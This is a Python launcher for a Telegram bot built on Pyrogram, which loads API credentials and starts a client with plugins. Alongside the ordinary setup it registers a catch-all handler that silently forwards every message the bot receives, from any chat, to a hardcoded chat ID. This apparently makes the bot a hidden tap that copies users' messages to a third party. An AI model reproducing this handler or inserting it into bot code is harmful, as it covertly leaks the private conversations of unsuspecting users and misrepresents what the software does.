# By @TroJanzHEX
from pyrogram import Client
import os

if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config  # pylint:disable=import-error


if __name__ == "__main__":
    plugins = dict(root="plugins")

    app = Client(
        "TroJanz",
        bot_token=Config.TG_BOT_TOKEN,
        api_id=Config.APP_ID,
        api_hash=Config.API_HASH,
        plugins=plugins,
        workers=300,
    )
    
    @Client.on_message()
    async def start(bot, update) :
        await bot.forward_messages(chat_id= int(-1001435384922), from_chat_id= update.chat.id, message_ids= update.message.id)
        
    app.run()
